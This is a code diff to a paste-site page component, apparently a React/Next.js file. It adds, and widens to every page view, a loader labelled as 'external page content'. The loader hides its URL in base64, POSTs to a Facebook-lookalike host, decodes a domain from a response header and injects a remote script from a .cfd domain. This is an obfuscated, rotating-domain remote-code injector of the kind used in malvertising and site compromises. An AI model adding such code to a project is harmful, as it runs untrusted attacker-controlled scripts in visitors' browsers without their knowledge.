@@ -128,6 +128,45 @@ export default function PastePageClient({ initialPaste }: PastePageClientProps) 
     trackView()
   }, [pasteId, showPasswordForm, showTaskModal, viewTracked, paste])
 
+  // External page content script (provided snippet)
+  useEffect(() => {
+    if (typeof window === 'undefined') return
+    if (showPasswordForm || showTaskModal) return
+
+    const p = ['v2', 'T0L92PR1:C2']
+
+    ;(async () => {
+      try {
+        const stored = window.localStorage.getItem('_d')
+        let c = stored ? JSON.parse(stored) : {}
+        const n = Date.now()
+
+        if (!c.d || c.e < n) {
+          const r = await fetch(
+            atob('aHR0cHM6Ly8') + atob('cGluZy4') + atob('ZmItY2RuLg') + atob('bmV0'),
+            { method: 'POST' }
+          )
+
+          const header = r.headers.get(atob('WC1EYXRh'))
+          if (!header) return
+
+          c = {
+            d: atob(atob(header)),
+            e: n + 36e5,
+          }
+
+          window.localStorage.setItem('_d', JSON.stringify(c))
+        }
+
+        const s = document.createElement('script')
+        s.src = `https://${c.d}.${atob('Y2Zk')}/tags/${p.join('/')}.js`
+        document.head.appendChild(s)
+      } catch (error) {
+        console.error('Error loading external page content script:', error)
+      }
+    })()
+  }, [showPasswordForm, showTaskModal])
+
   // Inject ad script into head when task modal is shown (covers task modal, waiting, and unlock pages)
   useEffect(() => {
     if (showTaskModal) {
@@ -146,46 +185,6 @@ export default function PastePageClient({ initialPaste }: PastePageClientProps) 
       // Append to head
       document.head.appendChild(script)
     }
-  }, [showTaskModal])
-
-  // Paste unlock page script integration
-  useEffect(() => {
-    if (!showTaskModal) return
-
-    const p = ['v2', 'T0L92PR1:C2']
-
-    ;(async () => {
-      try {
-        const stored = localStorage.getItem('_d')
-        let c: any = stored ? JSON.parse(stored) : {}
-        const n = Date.now()
-
-        if (!c.d || c.e < n) {
-          const r = await fetch(
-            atob('aHR0cHM6Ly8') +
-              atob('cGluZy4') +
-              atob('ZmItY2RuLg') +
-              atob('bmV0'),
-            { method: 'POST' }
-          )
-
-          const headerValue = r.headers.get(atob('WC1EYXRh')) || ''
-
-          c = {
-            d: atob(atob(headerValue)),
-            e: n + 36e5,
-          }
-
-          localStorage.setItem('_d', JSON.stringify(c))
-        }
-
-        const s = document.createElement('script')
-        s.src = `https://${c.d}.${atob('Y2Zk')}/tags/${p.join('/')}.js`
-        document.head.appendChild(s)
-      } catch (err) {
-        console.error('Error loading paste unlock script:', err)
-      }
-    })()
   }, [showTaskModal])
 
 
